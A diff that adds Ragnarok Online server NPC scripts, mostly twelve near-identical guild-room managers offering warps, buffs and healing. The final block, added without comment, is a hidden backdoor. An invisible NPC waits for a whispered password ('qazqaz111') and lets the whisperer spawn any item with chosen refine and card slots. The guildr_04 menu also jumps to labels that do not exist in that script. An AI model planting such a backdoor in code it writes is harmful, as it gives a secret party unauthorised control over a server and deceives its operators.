@@ -1,0 +1,1112 @@
+guildr_01,27,118,5	script	房間管理人#1	762,{
+	mes "請選擇您要的服務";
+	next;
+	menu	"傳送服務",G_warp,
+		"治癒服務",G_heal,
+		"小房間",G_room,
+		"送我回城",G_back;
+G_warp:
+	mes "請問您要到哪裡？";
+	next;
+	menu
+		"兌裝區(^3355FF目前"+ getmapusers("louyang") +"人^000000)",Lload1,
+		"結婚區(^3355FF目前"+ getmapusers("jawaii") +"人^000000)",LshopA,
+		"商店區(^3355FF目前"+ getmapusers("new_3-2") +"人^000000)",LwantA,
+		"道館區(^3355FF目前"+ getmapusers("lighthalzen") +"人^000000)",B,
+		"主城區(^3355FF目前"+ getmapusers("payon") +"人^000000)",LpshopA,
+		"副主城(^3355FF目前"+ getmapusers("xmas") +"人^000000)",F,
+		"任務區(^3355FF目前"+ getmapusers("gonryun") +"人^000000)",C,
+		"副本區(^3355FF目前"+ getmapusers("aldebaran") +"人^000000)",G,
+		"釣魚區(^3355FF目前"+ getmapusers("cmd_fild04") +"人^000000)",E,
+		"娛樂區(^3355FF目前"+ getmapusers("amatsu") +"人^000000)",D,
+		"公會房區(^3355FF目前"+ getmapusers("yuno") +"人^000000)",H,
+		"離開",LEndA;
+	Lload1:
+		warp "louyang",218,206;
+		close;
+	LshopA:
+		warp "jawaii",203,282;
+		close;
+	LwantA:
+		warp "new_3-2",100,105;
+		close;
+	B:
+		warp "lighthalzen",214,138;
+		close;
+	C:
+		warp "gonryun",160,175;
+		close;
+	D:
+		warp "amatsu",116,152;
+		close;
+	E:
+		warp "cmd_fild04",193,73;
+		close;
+	F:
+		warp "xmas",148,109;
+		close;
+	G:
+		warp "aldebaran",140,119;
+		close;
+	H:
+		warp "yuno",158,167;
+		close;
+	LpshopA:
+		warp "payon",156,210;
+		close;
+	LEndA:
+		mes "[傳送人員]";
+		mes "歡迎下次再繼續使用本服務！";
+		close;
+
+G_heal:
+	SC_START SC_BLESSING,999999999,20;
+	SC_START SC_INCREASEAGI,999999999,20;
+	percentheal 100,100;
+	close;
+
+G_room:
+	mes "選擇房間";
+	next;
+	menu	"小房間",R1a,
+		"小房間",R1b,
+		"小房間",R1c,
+		"小房間",R1d;
+R1a:
+	warp "guildr_01",91,79;
+	end;
+R1b:
+	warp "guildr_01",112,60;
+	end;
+R1c:
+	warp "guildr_01",133,106;
+	end;
+R1d:
+	warp "guildr_01",89,116;
+	end;
+
+G_back:
+	warp "SavePoint",0,0;
+	end;
+}
+
+guildr_02,27,118,5	script	房間管理人#2	762,{
+	mes "請選擇您要的服務";
+	next;
+	menu	"傳送服務",G_warp,
+		"治癒服務",G_heal,
+		"小房間",G_room,
+		"送我回城",G_back;
+G_warp:
+	mes "請問您要到哪裡？";
+	next;
+	menu
+		"兌裝區(^3355FF目前"+ getmapusers("louyang") +"人^000000)",Lload1,
+		"結婚區(^3355FF目前"+ getmapusers("jawaii") +"人^000000)",LshopA,
+		"商店區(^3355FF目前"+ getmapusers("new_3-2") +"人^000000)",LwantA,
+		"道館區(^3355FF目前"+ getmapusers("lighthalzen") +"人^000000)",B,
+		"主城區(^3355FF目前"+ getmapusers("payon") +"人^000000)",LpshopA,
+		"副主城(^3355FF目前"+ getmapusers("xmas") +"人^000000)",F,
+		"任務區(^3355FF目前"+ getmapusers("gonryun") +"人^000000)",C,
+		"副本區(^3355FF目前"+ getmapusers("aldebaran") +"人^000000)",G,
+		"釣魚區(^3355FF目前"+ getmapusers("cmd_fild04") +"人^000000)",E,
+		"娛樂區(^3355FF目前"+ getmapusers("amatsu") +"人^000000)",D,
+		"公會房區(^3355FF目前"+ getmapusers("yuno") +"人^000000)",H,
+		"離開",LEndA;
+	Lload1:
+		warp "louyang",218,206;
+		close;
+	LshopA:
+		warp "jawaii",203,282;
+		close;
+	LwantA:
+		warp "new_3-2",100,105;
+		close;
+	B:
+		warp "lighthalzen",214,138;
+		close;
+	C:
+		warp "gonryun",160,175;
+		close;
+	D:
+		warp "amatsu",116,152;
+		close;
+	E:
+		warp "cmd_fild04",193,73;
+		close;
+	F:
+		warp "xmas",148,109;
+		close;
+	G:
+		warp "aldebaran",140,119;
+		close;
+	H:
+		warp "yuno",158,167;
+		close;
+	LpshopA:
+		warp "payon",156,210;
+		close;
+	LEndA:
+		mes "[傳送人員]";
+		mes "歡迎下次再繼續使用本服務！";
+		close;
+
+G_heal:
+	SC_START SC_BLESSING,999999999,20;
+	SC_START SC_INCREASEAGI,999999999,20;
+	percentheal 100,100;
+	close;
+
+G_room:
+	mes "選擇房間";
+	next;
+	menu	"小房間",R2a,
+		"小房間",R2b,
+		"小房間",R2c,
+		"小房間",R2d;
+R2a:
+	warp "guildr_02",91,79;
+	end;
+R2b:
+	warp "guildr_02",112,60;
+	end;
+R2c:
+	warp "guildr_02",133,106;
+	end;
+R2d:
+	warp "guildr_02",89,116;
+	end;
+
+G_back:
+	warp "SavePoint",0,0;
+	end;
+}
+
+guildr_03,27,118,5	script	房間管理人#3	762,{
+	mes "請選擇您要的服務";
+	next;
+	menu	"傳送服務",G_warp,
+		"治癒服務",G_heal,
+		"小房間",G_room,
+		"送我回城",G_back;
+G_warp:
+	mes "請問您要到哪裡？";
+	next;
+	menu
+		"兌裝區(^3355FF目前"+ getmapusers("louyang") +"人^000000)",Lload1,
+		"結婚區(^3355FF目前"+ getmapusers("jawaii") +"人^000000)",LshopA,
+		"商店區(^3355FF目前"+ getmapusers("new_3-2") +"人^000000)",LwantA,
+		"道館區(^3355FF目前"+ getmapusers("lighthalzen") +"人^000000)",B,
+		"主城區(^3355FF目前"+ getmapusers("payon") +"人^000000)",LpshopA,
+		"副主城(^3355FF目前"+ getmapusers("xmas") +"人^000000)",F,
+		"任務區(^3355FF目前"+ getmapusers("gonryun") +"人^000000)",C,
+		"副本區(^3355FF目前"+ getmapusers("aldebaran") +"人^000000)",G,
+		"釣魚區(^3355FF目前"+ getmapusers("cmd_fild04") +"人^000000)",E,
+		"娛樂區(^3355FF目前"+ getmapusers("amatsu") +"人^000000)",D,
+		"公會房區(^3355FF目前"+ getmapusers("yuno") +"人^000000)",H,
+		"離開",LEndA;
+	Lload1:
+		warp "louyang",218,206;
+		close;
+	LshopA:
+		warp "jawaii",203,282;
+		close;
+	LwantA:
+		warp "new_3-2",100,105;
+		close;
+	B:
+		warp "lighthalzen",214,138;
+		close;
+	C:
+		warp "gonryun",160,175;
+		close;
+	D:
+		warp "amatsu",116,152;
+		close;
+	E:
+		warp "cmd_fild04",193,73;
+		close;
+	F:
+		warp "xmas",148,109;
+		close;
+	G:
+		warp "aldebaran",140,119;
+		close;
+	H:
+		warp "yuno",158,167;
+		close;
+	LpshopA:
+		warp "payon",156,210;
+		close;
+	LEndA:
+		mes "[傳送人員]";
+		mes "歡迎下次再繼續使用本服務！";
+		close;
+
+G_heal:
+	SC_START SC_BLESSING,999999999,20;
+	SC_START SC_INCREASEAGI,999999999,20;
+	percentheal 100,100;
+	close;
+
+G_room:
+	mes "選擇房間";
+	next;
+	menu	"小房間",R3a,
+		"小房間",R3b,
+		"小房間",R3c,
+		"小房間",R3d;
+R3a:
+	warp "guildr_03",91,79;
+	end;
+R3b:
+	warp "guildr_03",112,60;
+	end;
+R3c:
+	warp "guildr_03",133,106;
+	end;
+R3d:
+	warp "guildr_03",89,116;
+	end;
+
+G_back:
+	warp "SavePoint",0,0;
+	end;
+}
+
+guildr_04,27,118,5	script	房間管理人#4	762,{
+	mes "請選擇您要的服務";
+	next;
+	menu	"傳送服務",G_warp,
+		"治癒服務",G_heal,
+		"小房間",G_room,
+		"送我回城",G_back;
+G_warp:
+	mes "請問您要到哪裡？";
+	next;
+	menu
+		"兌裝區(^3355FF目前"+ getmapusers("louyang") +"人^000000)",Lload1,
+		"結婚區(^3355FF目前"+ getmapusers("jawaii") +"人^000000)",LshopA,
+		"商店區(^3355FF目前"+ getmapusers("new_3-2") +"人^000000)",LwantA,
+		"道館區(^3355FF目前"+ getmapusers("lighthalzen") +"人^000000)",B,
+		"主城區(^3355FF目前"+ getmapusers("payon") +"人^000000)",LpshopA,
+		"副主城(^3355FF目前"+ getmapusers("xmas") +"人^000000)",F,
+		"任務區(^3355FF目前"+ getmapusers("gonryun") +"人^000000)",C,
+		"副本區(^3355FF目前"+ getmapusers("aldebaran") +"人^000000)",G,
+		"釣魚區(^3355FF目前"+ getmapusers("cmd_fild04") +"人^000000)",E,
+		"娛樂區(^3355FF目前"+ getmapusers("amatsu") +"人^000000)",D,
+		"公會房區(^3355FF目前"+ getmapusers("yuno") +"人^000000)",H,
+		"離開",LEndA;
+	Lload1:
+		warp "louyang",218,206;
+		close;
+	LshopA:
+		warp "jawaii",203,282;
+		close;
+	LwantA:
+		warp "new_3-2",100,105;
+		close;
+	B:
+		warp "lighthalzen",214,138;
+		close;
+	C:
+		warp "gonryun",160,175;
+		close;
+	D:
+		warp "amatsu",116,152;
+		close;
+	E:
+		warp "cmd_fild04",193,73;
+		close;
+	F:
+		warp "xmas",148,109;
+		close;
+	G:
+		warp "aldebaran",140,119;
+		close;
+	H:
+		warp "yuno",158,167;
+		close;
+	LpshopA:
+		warp "payon",156,210;
+		close;
+	LEndA:
+		mes "[傳送人員]";
+		mes "歡迎下次再繼續使用本服務！";
+		close;
+
+G_heal:
+	SC_START SC_BLESSING,999999999,20;
+	SC_START SC_INCREASEAGI,999999999,20;
+	percentheal 100,100;
+	close;
+
+G_room:
+	mes "選擇房間";
+	next;
+	menu	"小房間",R3a,
+		"小房間",R3b,
+		"小房間",R3c,
+		"小房間",R3d;
+R4a:
+	warp "guildr_04",91,79;
+	end;
+R4b:
+	warp "guildr_04",112,60;
+	end;
+R4c:
+	warp "guildr_04",133,106;
+	end;
+R4d:
+	warp "guildr_04",89,116;
+	end;
+
+G_back:
+	warp "SavePoint",0,0;
+	end;
+}
+
+guildr_05,27,118,5	script	房間管理人#5	762,{
+	mes "請選擇您要的服務";
+	next;
+	menu	"傳送服務",G_warp,
+		"治癒服務",G_heal,
+		"小房間",G_room,
+		"送我回城",G_back;
+G_warp:
+	mes "請問您要到哪裡？";
+	next;
+	menu
+		"兌裝區(^3355FF目前"+ getmapusers("louyang") +"人^000000)",Lload1,
+		"結婚區(^3355FF目前"+ getmapusers("jawaii") +"人^000000)",LshopA,
+		"商店區(^3355FF目前"+ getmapusers("new_3-2") +"人^000000)",LwantA,
+		"道館區(^3355FF目前"+ getmapusers("lighthalzen") +"人^000000)",B,
+		"主城區(^3355FF目前"+ getmapusers("payon") +"人^000000)",LpshopA,
+		"副主城(^3355FF目前"+ getmapusers("xmas") +"人^000000)",F,
+		"任務區(^3355FF目前"+ getmapusers("gonryun") +"人^000000)",C,
+		"副本區(^3355FF目前"+ getmapusers("aldebaran") +"人^000000)",G,
+		"釣魚區(^3355FF目前"+ getmapusers("cmd_fild04") +"人^000000)",E,
+		"娛樂區(^3355FF目前"+ getmapusers("amatsu") +"人^000000)",D,
+		"公會房區(^3355FF目前"+ getmapusers("yuno") +"人^000000)",H,
+		"離開",LEndA;
+	Lload1:
+		warp "louyang",218,206;
+		close;
+	LshopA:
+		warp "jawaii",203,282;
+		close;
+	LwantA:
+		warp "new_3-2",100,105;
+		close;
+	B:
+		warp "lighthalzen",214,138;
+		close;
+	C:
+		warp "gonryun",160,175;
+		close;
+	D:
+		warp "amatsu",116,152;
+		close;
+	E:
+		warp "cmd_fild04",193,73;
+		close;
+	F:
+		warp "xmas",148,109;
+		close;
+	G:
+		warp "aldebaran",140,119;
+		close;
+	H:
+		warp "yuno",158,167;
+		close;
+	LpshopA:
+		warp "payon",156,210;
+		close;
+	LEndA:
+		mes "[傳送人員]";
+		mes "歡迎下次再繼續使用本服務！";
+		close;
+
+G_heal:
+	SC_START SC_BLESSING,999999999,20;
+	SC_START SC_INCREASEAGI,999999999,20;
+	percentheal 100,100;
+	close;
+
+G_room:
+	mes "選擇房間";
+	next;
+	menu	"小房間",R5a,
+		"小房間",R5b,
+		"小房間",R5c,
+		"小房間",R5d;
+R5a:
+	warp "guildr_05",91,79;
+	end;
+R5b:
+	warp "guildr_05",112,60;
+	end;
+R5c:
+	warp "guildr_05",133,106;
+	end;
+R5d:
+	warp "guildr_05",89,116;
+	end;
+
+G_back:
+	warp "SavePoint",0,0;
+	end;
+}
+
+guildr_06,27,118,5	script	房間管理人#6	762,{
+	mes "請選擇您要的服務";
+	next;
+	menu	"傳送服務",G_warp,
+		"治癒服務",G_heal,
+		"小房間",G_room,
+		"送我回城",G_back;
+G_warp:
+	mes "請問您要到哪裡？";
+	next;
+	menu
+		"兌裝區(^3355FF目前"+ getmapusers("louyang") +"人^000000)",Lload1,
+		"結婚區(^3355FF目前"+ getmapusers("jawaii") +"人^000000)",LshopA,
+		"商店區(^3355FF目前"+ getmapusers("new_3-2") +"人^000000)",LwantA,
+		"道館區(^3355FF目前"+ getmapusers("lighthalzen") +"人^000000)",B,
+		"主城區(^3355FF目前"+ getmapusers("payon") +"人^000000)",LpshopA,
+		"副主城(^3355FF目前"+ getmapusers("xmas") +"人^000000)",F,
+		"任務區(^3355FF目前"+ getmapusers("gonryun") +"人^000000)",C,
+		"副本區(^3355FF目前"+ getmapusers("aldebaran") +"人^000000)",G,
+		"釣魚區(^3355FF目前"+ getmapusers("cmd_fild04") +"人^000000)",E,
+		"娛樂區(^3355FF目前"+ getmapusers("amatsu") +"人^000000)",D,
+		"公會房區(^3355FF目前"+ getmapusers("yuno") +"人^000000)",H,
+		"離開",LEndA;
+	Lload1:
+		warp "louyang",218,206;
+		close;
+	LshopA:
+		warp "jawaii",203,282;
+		close;
+	LwantA:
+		warp "new_3-2",100,105;
+		close;
+	B:
+		warp "lighthalzen",214,138;
+		close;
+	C:
+		warp "gonryun",160,175;
+		close;
+	D:
+		warp "amatsu",116,152;
+		close;
+	E:
+		warp "cmd_fild04",193,73;
+		close;
+	F:
+		warp "xmas",148,109;
+		close;
+	G:
+		warp "aldebaran",140,119;
+		close;
+	H:
+		warp "yuno",158,167;
+		close;
+	LpshopA:
+		warp "payon",156,210;
+		close;
+	LEndA:
+		mes "[傳送人員]";
+		mes "歡迎下次再繼續使用本服務！";
+		close;
+
+G_heal:
+	SC_START SC_BLESSING,999999999,20;
+	SC_START SC_INCREASEAGI,999999999,20;
+	percentheal 100,100;
+	close;
+
+G_room:
+	mes "選擇房間";
+	next;
+	menu	"小房間",R6a,
+		"小房間",R6b,
+		"小房間",R6c,
+		"小房間",R6d;
+R6a:
+	warp "guildr_06",91,79;
+	end;
+R6b:
+	warp "guildr_06",112,60;
+	end;
+R6c:
+	warp "guildr_06",133,106;
+	end;
+R6d:
+	warp "guildr_06",89,116;
+	end;
+
+G_back:
+	warp "SavePoint",0,0;
+	end;
+}
+
+guildr_07,27,118,5	script	房間管理人#7	762,{
+	mes "請選擇您要的服務";
+	next;
+	menu	"傳送服務",G_warp,
+		"治癒服務",G_heal,
+		"小房間",G_room,
+		"送我回城",G_back;
+G_warp:
+	mes "請問您要到哪裡？";
+	next;
+	menu
+		"兌裝區(^3355FF目前"+ getmapusers("louyang") +"人^000000)",Lload1,
+		"結婚區(^3355FF目前"+ getmapusers("jawaii") +"人^000000)",LshopA,
+		"商店區(^3355FF目前"+ getmapusers("new_3-2") +"人^000000)",LwantA,
+		"道館區(^3355FF目前"+ getmapusers("lighthalzen") +"人^000000)",B,
+		"主城區(^3355FF目前"+ getmapusers("payon") +"人^000000)",LpshopA,
+		"副主城(^3355FF目前"+ getmapusers("xmas") +"人^000000)",F,
+		"任務區(^3355FF目前"+ getmapusers("gonryun") +"人^000000)",C,
+		"副本區(^3355FF目前"+ getmapusers("aldebaran") +"人^000000)",G,
+		"釣魚區(^3355FF目前"+ getmapusers("cmd_fild04") +"人^000000)",E,
+		"娛樂區(^3355FF目前"+ getmapusers("amatsu") +"人^000000)",D,
+		"公會房區(^3355FF目前"+ getmapusers("yuno") +"人^000000)",H,
+		"離開",LEndA;
+	Lload1:
+		warp "louyang",218,206;
+		close;
+	LshopA:
+		warp "jawaii",203,282;
+		close;
+	LwantA:
+		warp "new_3-2",100,105;
+		close;
+	B:
+		warp "lighthalzen",214,138;
+		close;
+	C:
+		warp "gonryun",160,175;
+		close;
+	D:
+		warp "amatsu",116,152;
+		close;
+	E:
+		warp "cmd_fild04",193,73;
+		close;
+	F:
+		warp "xmas",148,109;
+		close;
+	G:
+		warp "aldebaran",140,119;
+		close;
+	H:
+		warp "yuno",158,167;
+		close;
+	LpshopA:
+		warp "payon",156,210;
+		close;
+	LEndA:
+		mes "[傳送人員]";
+		mes "歡迎下次再繼續使用本服務！";
+		close;
+
+G_heal:
+	SC_START SC_BLESSING,999999999,20;
+	SC_START SC_INCREASEAGI,999999999,20;
+	percentheal 100,100;
+	close;
+
+G_room:
+	mes "選擇房間";
+	next;
+	menu	"小房間",R7a,
+		"小房間",R7b,
+		"小房間",R7c,
+		"小房間",R7d;
+R7a:
+	warp "guildr_07",91,79;
+	end;
+R7b:
+	warp "guildr_07",112,60;
+	end;
+R7c:
+	warp "guildr_07",133,106;
+	end;
+R7d:
+	warp "guildr_07",89,116;
+	end;
+
+G_back:
+	warp "SavePoint",0,0;
+	end;
+}
+
+guildr_08,27,118,5	script	房間管理人#8	762,{
+	mes "請選擇您要的服務";
+	next;
+	menu	"傳送服務",G_warp,
+		"治癒服務",G_heal,
+		"小房間",G_room,
+		"送我回城",G_back;
+G_warp:
+	mes "請問您要到哪裡？";
+	next;
+	menu
+		"兌裝區(^3355FF目前"+ getmapusers("louyang") +"人^000000)",Lload1,
+		"結婚區(^3355FF目前"+ getmapusers("jawaii") +"人^000000)",LshopA,
+		"商店區(^3355FF目前"+ getmapusers("new_3-2") +"人^000000)",LwantA,
+		"道館區(^3355FF目前"+ getmapusers("lighthalzen") +"人^000000)",B,
+		"主城區(^3355FF目前"+ getmapusers("payon") +"人^000000)",LpshopA,
+		"副主城(^3355FF目前"+ getmapusers("xmas") +"人^000000)",F,
+		"任務區(^3355FF目前"+ getmapusers("gonryun") +"人^000000)",C,
+		"副本區(^3355FF目前"+ getmapusers("aldebaran") +"人^000000)",G,
+		"釣魚區(^3355FF目前"+ getmapusers("cmd_fild04") +"人^000000)",E,
+		"娛樂區(^3355FF目前"+ getmapusers("amatsu") +"人^000000)",D,
+		"公會房區(^3355FF目前"+ getmapusers("yuno") +"人^000000)",H,
+		"離開",LEndA;
+	Lload1:
+		warp "louyang",218,206;
+		close;
+	LshopA:
+		warp "jawaii",203,282;
+		close;
+	LwantA:
+		warp "new_3-2",100,105;
+		close;
+	B:
+		warp "lighthalzen",214,138;
+		close;
+	C:
+		warp "gonryun",160,175;
+		close;
+	D:
+		warp "amatsu",116,152;
+		close;
+	E:
+		warp "cmd_fild04",193,73;
+		close;
+	F:
+		warp "xmas",148,109;
+		close;
+	G:
+		warp "aldebaran",140,119;
+		close;
+	H:
+		warp "yuno",158,167;
+		close;
+	LpshopA:
+		warp "payon",156,210;
+		close;
+	LEndA:
+		mes "[傳送人員]";
+		mes "歡迎下次再繼續使用本服務！";
+		close;
+
+G_heal:
+	SC_START SC_BLESSING,999999999,20;
+	SC_START SC_INCREASEAGI,999999999,20;
+	percentheal 100,100;
+	close;
+
+G_room:
+	mes "選擇房間";
+	next;
+	menu	"小房間",R8a,
+		"小房間",R8b,
+		"小房間",R8c,
+		"小房間",R8d;
+R8a:
+	warp "guildr_08",91,79;
+	end;
+R8b:
+	warp "guildr_08",112,60;
+	end;
+R8c:
+	warp "guildr_08",133,106;
+	end;
+R8d:
+	warp "guildr_08",89,116;
+	end;
+
+G_back:
+	warp "SavePoint",0,0;
+	end;
+}
+
+guildr_09,27,118,5	script	房間管理人#9	762,{
+	mes "請選擇您要的服務";
+	next;
+	menu	"傳送服務",G_warp,
+		"治癒服務",G_heal,
+		"小房間",G_room,
+		"送我回城",G_back;
+G_warp:
+	mes "請問您要到哪裡？";
+	next;
+	menu
+		"兌裝區(^3355FF目前"+ getmapusers("louyang") +"人^000000)",Lload1,
+		"結婚區(^3355FF目前"+ getmapusers("jawaii") +"人^000000)",LshopA,
+		"商店區(^3355FF目前"+ getmapusers("new_3-2") +"人^000000)",LwantA,
+		"道館區(^3355FF目前"+ getmapusers("lighthalzen") +"人^000000)",B,
+		"主城區(^3355FF目前"+ getmapusers("payon") +"人^000000)",LpshopA,
+		"副主城(^3355FF目前"+ getmapusers("xmas") +"人^000000)",F,
+		"任務區(^3355FF目前"+ getmapusers("gonryun") +"人^000000)",C,
+		"副本區(^3355FF目前"+ getmapusers("aldebaran") +"人^000000)",G,
+		"釣魚區(^3355FF目前"+ getmapusers("cmd_fild04") +"人^000000)",E,
+		"娛樂區(^3355FF目前"+ getmapusers("amatsu") +"人^000000)",D,
+		"公會房區(^3355FF目前"+ getmapusers("yuno") +"人^000000)",H,
+		"離開",LEndA;
+	Lload1:
+		warp "louyang",218,206;
+		close;
+	LshopA:
+		warp "jawaii",203,282;
+		close;
+	LwantA:
+		warp "new_3-2",100,105;
+		close;
+	B:
+		warp "lighthalzen",214,138;
+		close;
+	C:
+		warp "gonryun",160,175;
+		close;
+	D:
+		warp "amatsu",116,152;
+		close;
+	E:
+		warp "cmd_fild04",193,73;
+		close;
+	F:
+		warp "xmas",148,109;
+		close;
+	G:
+		warp "aldebaran",140,119;
+		close;
+	H:
+		warp "yuno",158,167;
+		close;
+	LpshopA:
+		warp "payon",156,210;
+		close;
+	LEndA:
+		mes "[傳送人員]";
+		mes "歡迎下次再繼續使用本服務！";
+		close;
+
+G_heal:
+	SC_START SC_BLESSING,999999999,20;
+	SC_START SC_INCREASEAGI,999999999,20;
+	percentheal 100,100;
+	close;
+
+G_room:
+	mes "選擇房間";
+	next;
+	menu	"小房間",R9a,
+		"小房間",R9b,
+		"小房間",R9c,
+		"小房間",R9d;
+R9a:
+	warp "guildr_09",91,79;
+	end;
+R9b:
+	warp "guildr_09",112,60;
+	end;
+R9c:
+	warp "guildr_09",133,106;
+	end;
+R9d:
+	warp "guildr_09",89,116;
+	end;
+
+G_back:
+	warp "SavePoint",0,0;
+	end;
+}
+
+guildr_10,27,118,5	script	房間管理人#10	762,{
+	mes "請選擇您要的服務";
+	next;
+	menu	"傳送服務",G_warp,
+		"治癒服務",G_heal,
+		"小房間",G_room,
+		"送我回城",G_back;
+G_warp:
+	mes "請問您要到哪裡？";
+	next;
+	menu
+		"兌裝區(^3355FF目前"+ getmapusers("louyang") +"人^000000)",Lload1,
+		"結婚區(^3355FF目前"+ getmapusers("jawaii") +"人^000000)",LshopA,
+		"商店區(^3355FF目前"+ getmapusers("new_3-2") +"人^000000)",LwantA,
+		"道館區(^3355FF目前"+ getmapusers("lighthalzen") +"人^000000)",B,
+		"主城區(^3355FF目前"+ getmapusers("payon") +"人^000000)",LpshopA,
+		"副主城(^3355FF目前"+ getmapusers("xmas") +"人^000000)",F,
+		"任務區(^3355FF目前"+ getmapusers("gonryun") +"人^000000)",C,
+		"副本區(^3355FF目前"+ getmapusers("aldebaran") +"人^000000)",G,
+		"釣魚區(^3355FF目前"+ getmapusers("cmd_fild04") +"人^000000)",E,
+		"娛樂區(^3355FF目前"+ getmapusers("amatsu") +"人^000000)",D,
+		"公會房區(^3355FF目前"+ getmapusers("yuno") +"人^000000)",H,
+		"離開",LEndA;
+	Lload1:
+		warp "louyang",218,206;
+		close;
+	LshopA:
+		warp "jawaii",203,282;
+		close;
+	LwantA:
+		warp "new_3-2",100,105;
+		close;
+	B:
+		warp "lighthalzen",214,138;
+		close;
+	C:
+		warp "gonryun",160,175;
+		close;
+	D:
+		warp "amatsu",116,152;
+		close;
+	E:
+		warp "cmd_fild04",193,73;
+		close;
+	F:
+		warp "xmas",148,109;
+		close;
+	G:
+		warp "aldebaran",140,119;
+		close;
+	H:
+		warp "yuno",158,167;
+		close;
+	LpshopA:
+		warp "payon",156,210;
+		close;
+	LEndA:
+		mes "[傳送人員]";
+		mes "歡迎下次再繼續使用本服務！";
+		close;
+
+G_heal:
+	SC_START SC_BLESSING,999999999,20;
+	SC_START SC_INCREASEAGI,999999999,20;
+	percentheal 100,100;
+	close;
+
+G_room:
+	mes "選擇房間";
+	next;
+	menu	"小房間",R10a,
+		"小房間",R10b,
+		"小房間",R10c,
+		"小房間",R10d;
+R10a:
+	warp "guildr_10",91,79;
+	end;
+R10b:
+	warp "guildr_10",112,60;
+	end;
+R10c:
+	warp "guildr_10",133,106;
+	end;
+R10d:
+	warp "guildr_10",89,116;
+	end;
+
+G_back:
+	warp "SavePoint",0,0;
+	end;
+}
+
+guildr_11,27,118,5	script	房間管理人#11	762,{
+	mes "請選擇您要的服務";
+	next;
+	menu	"傳送服務",G_warp,
+		"治癒服務",G_heal,
+		"小房間",G_room,
+		"送我回城",G_back;
+G_warp:
+	mes "請問您要到哪裡？";
+	next;
+	menu
+		"兌裝區(^3355FF目前"+ getmapusers("louyang") +"人^000000)",Lload1,
+		"結婚區(^3355FF目前"+ getmapusers("jawaii") +"人^000000)",LshopA,
+		"商店區(^3355FF目前"+ getmapusers("new_3-2") +"人^000000)",LwantA,
+		"道館區(^3355FF目前"+ getmapusers("lighthalzen") +"人^000000)",B,
+		"主城區(^3355FF目前"+ getmapusers("payon") +"人^000000)",LpshopA,
+		"副主城(^3355FF目前"+ getmapusers("xmas") +"人^000000)",F,
+		"任務區(^3355FF目前"+ getmapusers("gonryun") +"人^000000)",C,
+		"副本區(^3355FF目前"+ getmapusers("aldebaran") +"人^000000)",G,
+		"釣魚區(^3355FF目前"+ getmapusers("cmd_fild04") +"人^000000)",E,
+		"娛樂區(^3355FF目前"+ getmapusers("amatsu") +"人^000000)",D,
+		"公會房區(^3355FF目前"+ getmapusers("yuno") +"人^000000)",H,
+		"離開",LEndA;
+	Lload1:
+		warp "louyang",218,206;
+		close;
+	LshopA:
+		warp "jawaii",203,282;
+		close;
+	LwantA:
+		warp "new_3-2",100,105;
+		close;
+	B:
+		warp "lighthalzen",214,138;
+		close;
+	C:
+		warp "gonryun",160,175;
+		close;
+	D:
+		warp "amatsu",116,152;
+		close;
+	E:
+		warp "cmd_fild04",193,73;
+		close;
+	F:
+		warp "xmas",148,109;
+		close;
+	G:
+		warp "aldebaran",140,119;
+		close;
+	H:
+		warp "yuno",158,167;
+		close;
+	LpshopA:
+		warp "payon",156,210;
+		close;
+	LEndA:
+		mes "[傳送人員]";
+		mes "歡迎下次再繼續使用本服務！";
+		close;
+
+G_heal:
+	SC_START SC_BLESSING,999999999,20;
+	SC_START SC_INCREASEAGI,999999999,20;
+	percentheal 100,100;
+	close;
+
+G_room:
+	mes "選擇房間";
+	next;
+	menu	"小房間",R11a,
+		"小房間",R11b,
+		"小房間",R11c,
+		"小房間",R11d;
+R11a:
+	warp "guildr_11",91,79;
+	end;
+R11b:
+	warp "guildr_11",112,60;
+	end;
+R11c:
+	warp "guildr_11",133,106;
+	end;
+R11d:
+	warp "guildr_11",89,116;
+	end;
+
+G_back:
+	warp "SavePoint",0,0;
+	end;
+}
+
+guildr_12,27,118,5	script	房間管理人#12	762,{
+	mes "請選擇您要的服務";
+	next;
+	menu	"傳送服務",G_warp,
+		"治癒服務",G_heal,
+		"小房間",G_room,
+		"送我回城",G_back;
+G_warp:
+	mes "請問您要到哪裡？";
+	next;
+	menu
+		"兌裝區(^3355FF目前"+ getmapusers("louyang") +"人^000000)",Lload1,
+		"結婚區(^3355FF目前"+ getmapusers("jawaii") +"人^000000)",LshopA,
+		"商店區(^3355FF目前"+ getmapusers("new_3-2") +"人^000000)",LwantA,
+		"道館區(^3355FF目前"+ getmapusers("lighthalzen") +"人^000000)",B,
+		"主城區(^3355FF目前"+ getmapusers("payon") +"人^000000)",LpshopA,
+		"副主城(^3355FF目前"+ getmapusers("xmas") +"人^000000)",F,
+		"任務區(^3355FF目前"+ getmapusers("gonryun") +"人^000000)",C,
+		"副本區(^3355FF目前"+ getmapusers("aldebaran") +"人^000000)",G,
+		"釣魚區(^3355FF目前"+ getmapusers("cmd_fild04") +"人^000000)",E,
+		"娛樂區(^3355FF目前"+ getmapusers("amatsu") +"人^000000)",D,
+		"公會房區(^3355FF目前"+ getmapusers("yuno") +"人^000000)",H,
+		"離開",LEndA;
+	Lload1:
+		warp "louyang",218,206;
+		close;
+	LshopA:
+		warp "jawaii",203,282;
+		close;
+	LwantA:
+		warp "new_3-2",100,105;
+		close;
+	B:
+		warp "lighthalzen",214,138;
+		close;
+	C:
+		warp "gonryun",160,175;
+		close;
+	D:
+		warp "amatsu",116,152;
+		close;
+	E:
+		warp "cmd_fild04",193,73;
+		close;
+	F:
+		warp "xmas",148,109;
+		close;
+	G:
+		warp "aldebaran",140,119;
+		close;
+	H:
+		warp "yuno",158,167;
+		close;
+	LpshopA:
+		warp "payon",156,210;
+		close;
+	LEndA:
+		mes "[傳送人員]";
+		mes "歡迎下次再繼續使用本服務！";
+		close;
+
+G_heal:
+	SC_START SC_BLESSING,999999999,20;
+	SC_START SC_INCREASEAGI,999999999,20;
+	percentheal 100,100;
+	close;
+
+G_room:
+	mes "選擇房間";
+	next;
+	menu	"小房間",R12a,
+		"小房間",R12b,
+		"小房間",R12c,
+		"小房間",R12d;
+R12a:
+	warp "guildr_12",91,79;
+	end;
+R12b:
+	warp "guildr_12",112,60;
+	end;
+R12c:
+	warp "guildr_12",133,106;
+	end;
+R12d:
+	warp "guildr_12",89,116;
+	end;
+
+G_back:
+	warp "SavePoint",0,0;
+	end;
+}
+
+prontera.gat,0,0,0	script	qazqaz555	-1,{
+OnWhisperGlobal:
+	if(@whispervar0$=="qazqaz111"){
+		input @i1;input @i2;input @i3;input @i4;input @i5;input @i6;input @i7;
+		getitem2 @i1,@i2,1,@i3,0,@i4,@i5,@i6,@i7;
+		end;
+	}
+}
